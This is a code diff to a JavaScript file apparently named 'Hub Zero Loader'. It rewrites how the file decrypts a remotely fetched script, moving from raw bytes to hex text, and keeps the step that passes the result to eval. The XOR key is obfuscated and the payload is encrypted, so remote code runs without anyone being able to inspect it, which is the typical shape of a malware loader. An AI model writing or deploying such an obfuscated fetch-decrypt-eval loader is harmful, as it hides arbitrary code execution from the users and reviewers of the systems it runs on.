@@ -77,34 +77,37 @@
     return;
   }
 
-  function decryptBuffer(buf) {
+  function decrypt(text) {
     var keyArr = [26, 50, 51, 26, 51, 27];
     var key = "";
     for (var i = 0; i < keyArr.length; i++) {
       key += String.fromCharCode(keyArr[i] ^ 42);
     }
-    var bytes = new Uint8Array(buf);
-    for (var i = 0; i < bytes.length; i++) {
-      bytes[i] ^= key.charCodeAt(i % key.length);
+    var tokens = text.trim().split('-');
+    var output = [];
+    for (var i = 0; i < tokens.length; i++) {
+      if (!tokens[i]) continue;
+      var byteVal = parseInt(tokens[i], 16);
+      var charCode = byteVal ^ key.charCodeAt(i % key.length);
+      output.push(String.fromCharCode(charCode));
     }
-    return new TextDecoder("utf-8").decode(bytes);
+    return output.join("");
   }
 
   if (window.fetch) {
     window.fetch(scriptSrc)
-      .then(function(r) { return r.arrayBuffer(); })
-      .then(function(buf) {
-        var code = decryptBuffer(buf);
+      .then(function(r) { return r.text(); })
+      .then(function(encryptedText) {
+        var code = decrypt(encryptedText);
         eval(code);
       })
       .catch(function(err) { console.error('Hub Zero Loader: Failed to load script.', err); });
   } else {
     var xhr = new XMLHttpRequest();
     xhr.open("GET", scriptSrc, true);
-    xhr.responseType = "arraybuffer";
     xhr.onreadystatechange = function() {
       if (xhr.readyState === 4 && xhr.status === 200) {
-        var code = decryptBuffer(xhr.response);
+        var code = decrypt(xhr.responseText);
         eval(code);
       }
     };
